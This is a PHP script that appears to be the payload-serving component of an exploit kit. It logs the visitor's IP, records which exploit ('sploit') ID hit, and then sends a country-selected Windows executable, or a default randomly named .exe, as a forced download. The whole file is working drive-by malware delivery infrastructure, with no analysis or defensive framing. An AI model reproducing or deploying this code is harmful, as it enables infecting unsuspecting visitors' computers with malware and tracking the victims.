<?php
require_once( "epjmanyqducskoi.php" );
require_once( "epxwiwephretk9.php" );
require_once( "yqcwaqdzewisasdud.php" );
$ip = $_SERVER['REMOTE_ADDR'];
$country = getcountry( );
$r = mysql_query( "SELECT id,hit FROM stats WHERE ip=INET_ATON('{$ip}') AND time>UNIX_TIMESTAMP()-{$BANTIME} ORDER BY time DESC limit 1");
if ( mysql_num_rows( $r ) == 0 )
{
    exit();
}

$row = mysql_fetch_assoc( $r );
		if(isset($_GET['i']))
			{
				$sploitid=intval($_GET['i']);
				if ( isset( $SPLOITS[$sploitid] ) )
					{
						$hit = $sploitid;
					}
				else
					{
						exit();
					}
			}
    $id = $row['id'];
	
    mysql_query( "UPDATE stats SET hit='{$hit}' WHERE id={$id}" );









if (isset($COUNTRIES[$country]))
	{
    		$exe=file_get_contents( $COUNTRIES[$country] );
	}
else
	{

    				$exe=file_get_contents( "ethwinalxmdzkujwxrg.exe" );
	}

if ( $exe == "" )
{
    exit();
}
$len = strlen( $exe );
header( "Content-Type: application/octet-stream" );
header( "Content-Length: {$len}" );
header( "Content-Disposition: attachment; filename=ethwinalxmdzkujwxrg.exe" );
echo $exe;
exit( );
?>
